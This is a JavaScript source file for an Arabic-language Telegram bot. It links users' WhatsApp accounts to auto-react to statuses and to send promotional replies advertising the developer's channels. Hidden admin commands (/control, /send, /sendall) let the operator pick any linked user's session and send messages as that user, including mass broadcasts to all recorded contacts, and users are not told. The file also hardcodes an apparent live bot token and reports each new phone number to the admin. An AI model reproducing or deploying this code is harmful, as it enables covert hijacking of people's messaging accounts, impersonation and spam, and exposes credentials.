// ==================================================================
// 📦 استدعاء المكتبات (Dependencies)
// ==================================================================
const path = require('path');
const fs = require('fs');
const express = require('express');
const QRCode = require('qrcode');
const { v4: uuidv4 } = require('uuid');
const { Telegraf } = require('telegraf');
const pino = require('pino'); 
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');

// ==================================================================
// ⚙️ إعدادات البوت (Settings)
// ==================================================================
const app = express();
app.use(express.json());
const PORT = process.env.PORT || 3000;

// ⚠️⚠️⚠️ ضع توكن البوت هنا ⚠️⚠️⚠️
const BOT_TOKEN = process.env.BOT_TOKEN || "8595212169:AAEWRmeafPSF9O3goMDxneMEFEqz98-MBos"; 

const bot = new Telegraf(BOT_TOKEN);
const tokens = new Map();
const DEFAULT_EMOJI = '🔥';
const RESTRICTION_TIMEOUT = 2 * 60 * 60 * 1000; 

// ⚠️⚠️⚠️ معرف البوت البديل (تم تعديله ليقبل الرموز) ⚠️⚠️⚠️
const SECOND_BOT_USERNAME = "@wastory4_bot"; 

// متغير لتخزين الجلسة التي يتحكم بها الأدمن حالياً (للإرسال)
let adminControlSession = null;

// ==================================================================
// 🎛️ الإعدادات العامة
// ==================================================================
const SETTINGS_FILE = path.join(__dirname, 'settings.json');
let globalSettings = { replyEnabled: true, botPublicAccess: true };

if (fs.existsSync(SETTINGS_FILE)) {
    try { 
        const saved = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
        globalSettings = { ...globalSettings, ...saved };
    } catch { }
} else {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(globalSettings, null, 2));
}

function saveGlobalSettings() {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(globalSettings, null, 2));
}

function toggleReplyEnabled() {
    globalSettings.replyEnabled = !globalSettings.replyEnabled;
    saveGlobalSettings();
    return globalSettings.replyEnabled;
}

// 🛡️ دالة التحقق من حالة البوت (ON/OFF) - تم إصلاح الخطأ هنا
async function checkBotAccess(ctx) {
    if (ctx.from.id === ADMIN_ID) return true;
    if (globalSettings.botPublicAccess) return true;

    // تم التحويل إلى HTML لتجنب خطأ الشرطة السفلية _
    await ctx.reply(`⚠️ <b>عذراً، البوت متوقف حالياً بسبب الضغط.</b>\n\nيرجى استخدام البوت البديل:\n${SECOND_BOT_USERNAME}`, { parse_mode: 'HTML' });
    return false;
}

// ==================================================================
// 🚀 منع التكرار
// ==================================================================
const processedStoryIds = new Set();
const HISTORY_FILE = path.join(__dirname, 'story_history.json');
let historyCache = {}; 

if (fs.existsSync(HISTORY_FILE)) {
    try {
        historyCache = JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
    } catch { historyCache = {}; }
}

function updateStoryHistory(participant) {
    const now = Date.now();
    historyCache[participant] = now;
    fs.writeFile(HISTORY_FILE, JSON.stringify(historyCache, null, 2), () => {});
}

function canReply(participant) {
    const lastTime = historyCache[participant];
    if (!lastTime) return true;
    return (Date.now() - lastTime) > (12 * 60 * 60 * 1000);
}

// ==================================================================
// 🛡️ معالجة الأخطاء
// ==================================================================
bot.catch((err, ctx) => {
    console.log(`[Telegram Error]`, err.message);
});

// ==================================================================
// 💾 دوال النظام
// ==================================================================
function cleanupOldSessions() {
  const authDir = path.join(__dirname, 'auth');
  if (fs.existsSync(authDir)) {
    const now = Date.now();
    for (const token of fs.readdirSync(authDir)) {
      const sessionPath = path.join(authDir, token, 'creds.json');
      if (fs.existsSync(sessionPath)) {
        if (now - fs.statSync(sessionPath).mtimeMs > 30 * 24 * 60 * 60 * 1000) {
          fs.rmSync(path.join(authDir, token), { recursive: true, force: true });
        }
      }
    }
  }
}
cleanupOldSessions();

function saveConfig(token, data) {
  const dir = path.join(__dirname, 'configs');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir);
  const current = loadConfig(token);
  const newData = { ...current, ...data };
  fs.writeFileSync(path.join(dir, token + '.json'), JSON.stringify(newData, null, 2));
}

function loadConfig(token) {
  try {
    const f = path.join(__dirname, 'configs', token + '.json');
    if (fs.existsSync(f)) return JSON.parse(fs.readFileSync(f, 'utf8'));
  } catch { }
  return {};
}

function getOrCreateToken(userId) {
  let token;
  for (const [t, v] of tokens.entries()) {
    if (v.telegramUser === userId) { token = t; break; }
  }

  if (!token) {
      const configDir = path.join(__dirname, 'configs');
      if (fs.existsSync(configDir)) {
          for (const file of fs.readdirSync(configDir)) {
              if (file.endsWith('.json')) {
                  try {
                      const data = JSON.parse(fs.readFileSync(path.join(configDir, file)));
                      if (data.telegramUser === userId) {
                          token = file.replace('.json', '');
                          tokens.set(token, { 
                            createdAt: Date.now(), 
                            sseResponses: new Set(), 
                            status: 'waiting', 
                            telegramUser: userId, 
                            emoji: data.emoji || DEFAULT_EMOJI,
                            waitPhone: false,
                            waitEmoji: false,
                            timeoutId: null,
                            isRestricted: false,
                            restrictionTimer: null,
                            isNewLogin: false
                          });
                          break;
                      }
                  } catch {}
              }
          }
      }
  }

  if (!token) {
    token = uuidv4().slice(0, 8).toUpperCase();
    let cfg = loadConfig(token);
    const initialEmoji = cfg.emoji || DEFAULT_EMOJI;
    
    tokens.set(token, { 
        createdAt: Date.now(), 
        sseResponses: new Set(), 
        status: 'waiting', 
        telegramUser: userId, 
        emoji: initialEmoji,
        waitPhone: false,
        waitEmoji: false,
        timeoutId: null,
        isRestricted: false,
        restrictionTimer: null,
        isNewLogin: true 
    });
    saveConfig(token, { telegramUser: userId, emoji: initialEmoji });
  }
  return token;
}

// ==================================================================
// 🤖 بوت التليجرام
// ==================================================================
const CHANNEL_ID = -1003464766843; 
const ADMIN_ID = 6502437203; 

bot.start(async (ctx) => {
    if (!await checkBotAccess(ctx)) return;

    try {
        const member = await ctx.telegram.getChatMember(CHANNEL_ID, ctx.from.id);
        if (!['member', 'administrator', 'creator'].includes(member.status)) throw new Error();
    } catch {
        return ctx.reply('- اشترك اولا لتتمكن من استخدام البوت🤍.\n@wa_storybot', {
             reply_markup: { inline_keyboard: [[{ text: '✅ تحقق من الاشتراك', callback_data: 'check_sub' }]] }
        });
    }
    
    const token = getOrCreateToken(ctx.from.id);
    const config = loadConfig(token);
    const statusText = globalSettings.replyEnabled ? 'مفعل ✅' : 'معطل ❌';

    let isRegistered = false;
    const userFile = path.join(__dirname, 'user_data', `user_${ctx.from.id}.json`);
    if (fs.existsSync(userFile)) {
        try {
            const data = JSON.parse(fs.readFileSync(userFile));
            if (Object.keys(data).length > 0) isRegistered = true;
        } catch {}
    }

    let keyboard = [];
    if (isRegistered) {
        keyboard = [
            [{ text: '🎭 تغيير الإيموجي', callback_data: 'set_emoji' }, { text: '📱 حساباتي', callback_data: 'my_accounts' }],
            [{ text: '➕ ربط رقم آخر', callback_data: 'add_new_account' }]
        ];
    } else {
        keyboard = [
            [{ text: '🔢 ربط كود', callback_data: 'link_code' }]
        ];
    }

    keyboard.push([
        { text: 'المطور </>', url: 'https://t.me/AAmr_Hany', transparent: true },
        { text: 'قناة الواتساب', url: 'https://whatsapp.com/channel/0029VbBnlqn05MUhQvfwQu3O', transparent: true },
        { text: 'قناة التليجرام', url: 'https://t.me/wa_storybot', transparent: true }
    ]);

    await ctx.reply(`👋 *مرحباً بك!*\n\n` +
        `🔥 الإيموجي الحالي: ${config.emoji || DEFAULT_EMOJI}\n` +
        `📨 حالة الرد التلقائي: ${statusText}`, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('add_new_account', async (ctx) => {
    if (!await checkBotAccess(ctx)) return;
    await ctx.reply('👇 اختر طريقة الربط للرقم الجديد:', {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔢 ربط كود', callback_data: 'link_code' }]
            ]
        }
    });
    await ctx.answerCbQuery();
});

// 🔥🔥🔥 أوامر التحكم (HTML FIX) 🔥🔥🔥
bot.command('on', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    globalSettings.botPublicAccess = true;
    saveGlobalSettings();
    ctx.reply('🟢 *تم تفعيل البوت لجميع الأعضاء.*', { parse_mode: 'Markdown' });
});

bot.command('off', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    globalSettings.botPublicAccess = false;
    saveGlobalSettings();
    // تم التحويل إلى HTML لتجنب خطأ الشرطة السفلية
    ctx.reply(`🔴 <b>تم إيقاف البوت عن العامة.</b> \nسيتم توجيههم إلى: ${SECOND_BOT_USERNAME}`, { parse_mode: 'HTML' });
});

bot.command('toggle', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('⛔ هذا الأمر للمطور فقط.');
    const newState = toggleReplyEnabled();
    ctx.reply(newState ? '✅ *تم تفعيل الرد.*' : '❌ *تم تعطيل الرد.*', { parse_mode: 'Markdown' });
});

bot.command('control', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('⛔ هذا الأمر للمطور فقط.');

    try {
        const userDir = path.join(__dirname, 'user_data');
        let buttons = [];
        
        if (fs.existsSync(userDir)) {
            fs.readdirSync(userDir).forEach(file => {
                if (file.endsWith('.json')) {
                    try {
                        const data = JSON.parse(fs.readFileSync(path.join(userDir, file)));
                        Object.keys(data).forEach(phone => {
                            buttons.push([{ text: `📱 ${phone}`, callback_data: `ctrl_${data[phone].token}` }]);
                        });
                    } catch {}
                }
            });
        }

        if (buttons.length === 0) return ctx.reply('📂 لا توجد حسابات متصلة.');

        await ctx.reply('🎮 *اختر الحساب الذي تريد استخدامه للإرسال:*', {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });

    } catch (e) { ctx.reply('❌ خطأ.'); }
});

bot.action(/ctrl_(.+)/, async (ctx) => {
    const token = ctx.match[1];
    if (!tokens.has(token)) return ctx.reply('⚠️ هذا الحساب غير متصل حالياً.');
    
    adminControlSession = token;
    await ctx.reply(`✅ *تم اختيار الحساب بنجاح!*\n\nالآن يمكنك:\n\n1️⃣ إرسال رسالة فردية:\n\`/send [الرقم] [الرسالة]\`\n\n2️⃣ إرسال للكل (Broadcast):\n\`/sendall [الثواني] [الرسالة]\``, { parse_mode: 'Markdown' });
    await ctx.answerCbQuery();
});

bot.command('send', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    if (!adminControlSession || !tokens.has(adminControlSession)) {
        return ctx.reply('⚠️ لم تختر حساباً أو الحساب انفصل. استخدم /control أولاً.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply('❌ تنسيق خاطئ.\nاستخدم: `/send الرقم الرسالة`');

    const targetPhone = args[1].replace('+', '') + '@s.whatsapp.net';
    const msgContent = args.slice(2).join(' ');
    const entry = tokens.get(adminControlSession);

    try {
        await entry.socketInfo.sock.sendMessage(targetPhone, { text: msgContent });
        ctx.reply('✅ تم الإرسال بنجاح.');
    } catch (e) {
        ctx.reply(`❌ فشل الإرسال: ${e.message}`);
    }
});

bot.command('sendall', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    if (!adminControlSession || !tokens.has(adminControlSession)) {
        return ctx.reply('⚠️ لم تختر حساباً للتحكم به. استخدم /control أولاً.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply('❌ تنسيق خاطئ.\nاستخدم: `/sendall [عدد_الثواني] [الرسالة]`');

    const delaySeconds = parseFloat(args[1]);
    if (isNaN(delaySeconds) || delaySeconds < 0) return ctx.reply('❌ الرجاء إدخال رقم صحيح للثواني.');

    const messageText = args.slice(2).join(' ');
    const entry = tokens.get(adminControlSession);
    const delayMs = delaySeconds * 1000; 
    
    const targets = Object.keys(historyCache);
    
    if (targets.length === 0) {
        return ctx.reply('⚠️ لا توجد جهات اتصال مسجلة في الذاكرة (لم يشاهد البوت أي ستوري بعد).');
    }

    await ctx.reply(`🔄 *جاري بدء الإرسال الجماعي...*\n\n👥 العدد المستهدف: ${targets.length}\n⏳ الفاصل الزمني: ${delaySeconds} ثانية\n\nسيتم إعلامك عند الانتهاء.`, { parse_mode: 'Markdown' });

    (async () => {
        let successCount = 0;
        let failCount = 0;

        for (const jid of targets) {
            try {
                await entry.socketInfo.sock.sendMessage(jid, { text: messageText });
                successCount++;
                await delay(delayMs);
            } catch (e) {
                failCount++;
            }
        }
        
        bot.telegram.sendMessage(ADMIN_ID, 
            `✅ *اكتملت عملية الإرسال الجماعي*\n\n` +
            `📤 تم الإرسال: ${successCount}\n` +
            `❌ فشل: ${failCount}`, 
            { parse_mode: 'Markdown' }
        );
    })();
});

bot.command('users', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('⛔ هذا الأمر للمطور فقط.');
    try {
        const userDir = path.join(__dirname, 'user_data');
        if (!fs.existsSync(userDir)) return ctx.reply('📂 لا يوجد مستخدمين.');
        let numbers = [];
        fs.readdirSync(userDir).forEach(file => {
            if (file.endsWith('.json')) {
                try {
                    const data = JSON.parse(fs.readFileSync(path.join(userDir, file)));
                    numbers.push(...Object.keys(data));
                } catch {}
            }
        });
        if (numbers.length === 0) return ctx.reply('📂 لا يوجد أرقام.');
        let msg = `📊 *المستخدمين:* ${numbers.length}\n\n`;
        numbers.forEach((num, i) => msg += `${i + 1}. \`+${num}\`\n`);
        ctx.reply(msg, { parse_mode: 'Markdown' });
    } catch { ctx.reply('❌ خطأ.'); }
});

bot.command('connect', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('⛔ هذا الأمر للمطور فقط.');
    const sessionCount = tokens.size;
    if (sessionCount === 0) return ctx.reply('⚠️ لا توجد جلسات نشطة حالياً.');
    
    await ctx.reply(`🔄 جاري إنعاش ${sessionCount} حساب...`);
    
    for (const [token, entry] of tokens.entries()) {
        try {
            if (entry.socketInfo && entry.socketInfo.sock) { 
                entry.socketInfo.sock.end(undefined); 
            }
            entry.socketInfo = null;
            
            const cfg = loadConfig(token);
            if(cfg.emoji) entry.emoji = cfg.emoji;

            setTimeout(() => { 
                createWASocket(token, entry).catch(e => console.log(`Restart Error ${token}:`, e)); 
            }, 1000);
        } catch (e) { console.log(`Failed to refresh session ${token}`, e); }
    }
    ctx.reply('✅ تم.');
});

bot.command('remove', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('⛔ هذا الأمر للمطور فقط.');
    try {
        const authDir = path.join(__dirname, 'auth');
        const userDir = path.join(__dirname, 'user_data');
        const configDir = path.join(__dirname, 'configs');
        const validTokens = new Set();
        if (fs.existsSync(userDir)) {
            fs.readdirSync(userDir).forEach(file => {
                if (file.endsWith('.json')) {
                    try {
                        const data = JSON.parse(fs.readFileSync(path.join(userDir, file)));
                        Object.values(data).forEach(info => { if (info && info.token) validTokens.add(info.token); });
                    } catch {}
                }
            });
        }
        let deletedCount = 0;
        if (fs.existsSync(authDir)) {
            for (const token of fs.readdirSync(authDir)) {
                if (!validTokens.has(token)) {
                    const entry = tokens.get(token);
                    if (entry?.socketInfo?.sock) { try { entry.socketInfo.sock.end(undefined); } catch {} }
                    tokens.delete(token);
                    try {
                        fs.rmSync(path.join(authDir, token), { recursive: true, force: true });
                        if (fs.existsSync(path.join(configDir, token + '.json'))) fs.unlinkSync(path.join(configDir, token + '.json'));
                        deletedCount++;
                    } catch {}
                }
            }
        }
        ctx.reply(`🗑️ تم حذف ${deletedCount} جلسة.`, { parse_mode: 'Markdown' });
    } catch { ctx.reply('❌ خطأ.'); }
});

bot.action('check_sub', (ctx) => ctx.reply('حاول الآن /start'));

bot.action('set_emoji', async (ctx) => {
    if (!await checkBotAccess(ctx)) return;
    const token = getOrCreateToken(ctx.from.id);
    const entry = tokens.get(token);
    entry.waitEmoji = true;
    entry.waitPhone = false;
    await ctx.reply('🎭 أرسل الإيموجي الجديد الآن:');
    await ctx.answerCbQuery().catch(() => {});
});

bot.on('text', async (ctx) => {
    if (ctx.message.text.startsWith('/')) return;
    if (!await checkBotAccess(ctx)) return;

    const text = ctx.message.text.trim();
    const token = getOrCreateToken(ctx.from.id);
    const entry = tokens.get(token);

    if (entry.waitEmoji) {
        if ([...text].length <= 2) {
            entry.waitEmoji = false;
            entry.emoji = text;
            saveConfig(token, { emoji: text });
            await ctx.reply(`✅ تم الحفظ: ${text}`);
        } else {
            ctx.reply('❌ إيموجي واحد فقط.');
        }
        return;
    }

    if (entry.waitPhone) {
        if (/^\d{10,15}$/.test(text)) {
            entry.waitPhone = false;
            entry.isNewLogin = true; 
            
            ctx.reply(`⏳ جاري طلب الكود: ${text}`);

            if (entry.socketInfo?.sock) {
                try { entry.socketInfo.sock.end(undefined); } catch {}
                entry.socketInfo = null;
            }
            if (entry.timeoutId) {
                clearTimeout(entry.timeoutId);
                entry.timeoutId = null;
            }
            await delay(1500); 
            
            const authPath = path.join(__dirname, 'auth', token);
            if(fs.existsSync(authPath)) {
                try { fs.rmSync(authPath, { recursive: true, force: true }); } catch {}
            }
            
            createWASocket(token, entry, text);
        } else {
            ctx.reply('❌ رقم خطأ.');
        }
    }
});

bot.action('link', async (ctx) => {
    if (!await checkBotAccess(ctx)) return;
    const token = getOrCreateToken(ctx.from.id);
    const entry = tokens.get(token);
    entry.waitPhone = false;
    entry.waitEmoji = false;
    entry.isNewLogin = true;
    
    if (entry.socketInfo?.sock) {
        entry.socketInfo.sock.end(undefined);
        await delay(500);
    }
    const authPath = path.join(__dirname, 'auth', token);
    try { fs.rmSync(authPath, { recursive: true, force: true }); } catch {}

    await createWASocket(token, entry);
    
    ctx.reply('انتظر قليلاً...');
    await ctx.answerCbQuery().catch(() => {});
});

bot.action('link_code', async (ctx) => {
    if (!await checkBotAccess(ctx)) return;
    const token = getOrCreateToken(ctx.from.id);
    const entry = tokens.get(token);
    entry.waitPhone = true; 
    entry.waitEmoji = false;
    await ctx.reply('📞 *الربط باستخدام كود الاقتران*\n\n' +
    'من فضلك أرسل رقم هاتفك في الواتساب مع رمز الدولة.\n' +
    'مثال: `201012345678`\n\n' +
    '_(أرسل الأرقام فقط بدون علامة + أو مسافات)_',{ parse_mode: 'Markdown' });
    await ctx.answerCbQuery().catch(() => {});
});

bot.action('my_accounts', async (ctx) => {
    if (!await checkBotAccess(ctx)) return;
    try {
        const f = path.join(__dirname, 'user_data', `user_${ctx.from.id}.json`);
        if (fs.existsSync(f)) {
            const d = JSON.parse(fs.readFileSync(f));
            if (Object.keys(d).length > 0) {
                await ctx.reply(`📱 الحسابات:\n${Object.keys(d).join('\n')}`);
            } else {
                await ctx.reply('لا يوجد حسابات.');
            }
        } else await ctx.reply('لا يوجد حسابات.');
    } catch {}
    await ctx.answerCbQuery().catch(() => {});
});

// ==================================================================
// 🟢 واتساب
// ==================================================================
async function createWASocket(token, entry, phoneNumber = null) {
  const authPath = path.join(__dirname, 'auth', token);
  if (!fs.existsSync(authPath)) fs.mkdirSync(authPath, { recursive: true });
  
  const { state, saveCreds } = await useMultiFileAuthState(authPath);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    logger: pino({ level: 'silent' }), 
    syncFullHistory: false, 
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: false,
    connectTimeoutMs: 60000, 
    defaultQueryTimeoutMs: 60000, 
    keepAliveIntervalMs: 20000,
    retryRequestDelayMs: 3000,
  });

  entry.socketInfo = { sock };

  if (phoneNumber && !sock.authState.creds.registered) {
    setTimeout(async () => {
      try {
        const code = await sock.requestPairingCode(phoneNumber);
        if(entry.telegramUser) {
            bot.telegram.sendMessage(entry.telegramUser, `🔐 كود الربط: \`${code}\`\n\n⏳ *امامك دقيقه للتسجيل.*`, { parse_mode: 'Markdown' });
            
            entry.timeoutId = setTimeout(() => {
                if (sock && !sock.authState.creds.registered) {
                    try { sock.end(undefined); } catch {}
                    try { fs.rmSync(authPath, { recursive: true, force: true }); } catch {}
                    bot.telegram.sendMessage(entry.telegramUser, '⏰ انتهى الوقت.');
                }
            }, 60000); 
        }
      } catch (e) { 
          if(entry.telegramUser) bot.telegram.sendMessage(entry.telegramUser, '⚠️ فشل استخراج الكود.');
      }
    }, 3000);
  }

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('messages.upsert', async ({ messages }) => {
    try {
      const m = messages[0];
      if (!m.message) return;
      if (m.messageStubType && m.messageStubType === 1) return;
      if (m.key.remoteJid !== 'status@broadcast') return;
      if (m.key.fromMe) return;

      const msg = m.message;
      const isStory = msg.imageMessage || msg.videoMessage || msg.extendedTextMessage;
      if (!isStory) return; 
      if (msg.protocolMessage) return; 

      const uniqueStoryKey = `${token}_${m.key.id}`;
      if (processedStoryIds.has(uniqueStoryKey)) return;
      processedStoryIds.add(uniqueStoryKey);
      setTimeout(() => processedStoryIds.delete(uniqueStoryKey), 24 * 60 * 60 * 1000);

      const participant = m.key.participant || m.participant;
      console.log(`[STORY] Seen by token: ${token} | From: ${participant}`);

      const currentConfig = loadConfig(token);
      const reactionEmoji = currentConfig.emoji || DEFAULT_EMOJI;

      try {
        if (globalSettings.replyEnabled && !entry.isRestricted) {
            if (canReply(participant)) {
               await delay(1500); 
               await sock.sendMessage(participant, { 
                   text: '#ˢᵗᵒʳʸ_ᵇᵒᵗ🌚\n𝘪 𝘩𝘢𝘷𝘦 𝘴𝘦𝘦𝘯 𝘺𝘰𝘶𝘳 𝘴𝘵𝘰𝘳𝘺🌚🤍\nʲᵒᶤᶰ ᵐʸ ᶜʰᵃᶰᶰᵉˡ 🤍\n\n(https://whatsapp.com/channel/0029VbBnlqn05MUhQvfwQu3O)\nʲᵒᶤᶰ ᵐʸ ᶜʰᵃᶰᶰᵉˡ🤍 2\n\nhttps://whatsapp.com/channel/0029VbBVaaiDuMRhRl0Zlt3Y' 
               }, { quoted: m });
               updateStoryHistory(participant);
               console.log(`✅ Reply Sent`);
            }
        }
      } catch (e) { 
          const errStr = String(e);
          if (!errStr.includes('decrypt') && !errStr.includes('session')) {
              if (!entry.isRestricted) {
                  entry.isRestricted = true;
                  if (entry.restrictionTimer) clearTimeout(entry.restrictionTimer);
                  entry.restrictionTimer = setTimeout(() => { entry.isRestricted = false; }, RESTRICTION_TIMEOUT);
              }
          }
      }

      try { 
          await sock.readMessages([{ 
              remoteJid: 'status@broadcast', 
              id: m.key.id, 
              participant: participant 
          }]); 
      } catch {}

      try {
        const randomDelay = Math.floor(Math.random() * 1000) + 1500;
        await delay(randomDelay);
        try {
            await sock.sendMessage('status@broadcast', {
                react: { text: reactionEmoji, key: m.key }
            }, { statusJidList: [participant] });
        } catch(err1) {
            await sock.sendMessage('status@broadcast', {
                react: { text: reactionEmoji, key: m.key }
            });
        }
        console.log(`😍 Reacted`);
      } catch (e) {}

    } catch (e) {}
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    
    if (qr && !phoneNumber && entry.socketInfo?.sock) {
        entry.socketInfo.sock.qr = qr;
    }

    if (connection === 'open') {
        if (entry.timeoutId) {
            clearTimeout(entry.timeoutId);
            entry.timeoutId = null;
        }

        if (entry.isNewLogin && entry.telegramUser) {
            bot.telegram.sendMessage(entry.telegramUser, '✅ تم الاتصال بنجاح!');
            entry.isNewLogin = false; 
        }
        
        const user = sock.user?.id?.split(':')[0];
        if (user) {
            const f = path.join(__dirname, 'user_data', `user_${entry.telegramUser}.json`);
            if (!fs.existsSync(path.dirname(f))) fs.mkdirSync(path.dirname(f));
            let d = fs.existsSync(f) ? JSON.parse(fs.readFileSync(f)) : {};
            if (!d[user]) bot.telegram.sendMessage(6502437203, `New User: +${user}`);
            d[user] = { token }; 
            fs.writeFileSync(f, JSON.stringify(d));
        }
    }
    
    if (connection === 'close') {
         const code = lastDisconnect?.error?.output?.statusCode;
         if (code === DisconnectReason.loggedOut) {
             console.log(`[${token}] Logged Out!`);
             try { fs.rmSync(path.join(__dirname, 'auth', token), { recursive: true, force: true }); } catch {}
             try { fs.unlinkSync(path.join(__dirname, 'configs', token + '.json')); } catch {}
             
             if (entry.telegramUser) {
                 const userFile = path.join(__dirname, 'user_data', `user_${entry.telegramUser}.json`);
                 if (fs.existsSync(userFile)) {
                     try {
                         let userData = JSON.parse(fs.readFileSync(userFile));
                         let changed = false;
                         for (const [phone, info] of Object.entries(userData)) {
                             if (info.token === token) { delete userData[phone]; changed = true; }
                         }
                         if (changed) {
                             if (Object.keys(userData).length === 0) fs.unlinkSync(userFile);
                             else fs.writeFileSync(userFile, JSON.stringify(userData));
                         }
                     } catch {}
                 }
                 bot.telegram.sendMessage(entry.telegramUser, '⚠️ تم تسجيل الخروج.');
             }
             tokens.delete(token);
         } else {
             if (tokens.has(token)) {
                 setTimeout(() => createWASocket(token, entry), 5000);
             }
         }
    }
  });
}

// تحميل الجلسات
const configDir = path.join(__dirname, 'configs');
if (fs.existsSync(configDir)) {
    for (const file of fs.readdirSync(configDir)) {
        if (file.endsWith('.json')) {
            try {
                const token = file.replace('.json', '');
                const data = JSON.parse(fs.readFileSync(path.join(configDir, file)));
                
                if (fs.existsSync(path.join(__dirname, 'auth', token))) {
                    tokens.set(token, {
                        createdAt: Date.now(),
                        sseResponses: new Set(),
                        status: 'waiting',
                        telegramUser: data.telegramUser,
                        emoji: data.emoji || DEFAULT_EMOJI,
                        waitPhone: false,
                        waitEmoji: false,
                        isRestricted: false,
                        restrictionTimer: null,
                        isNewLogin: false 
                    });
                    createWASocket(token, tokens.get(token)).catch(e => console.log('Auto start error:', e));
                }
            } catch (e) { console.log('Config load error:', e); }
        }
    }
}

app.listen(PORT, () => console.log(`Server: ${PORT}`));
bot.launch();

process.on('uncaughtException', (err) => {
    const msg = String(err);
    if (!msg.includes('Bad MAC') && !msg.includes('decrypt') && !msg.includes('closed session')) console.log('Caught exception:', err);
});
process.on('unhandledRejection', (err) => {
    const msg = String(err);
    if (!msg.includes('Bad MAC') && !msg.includes('decrypt') && !msg.includes('closed session')) console.log('Caught unhandledRejection:', err);
});
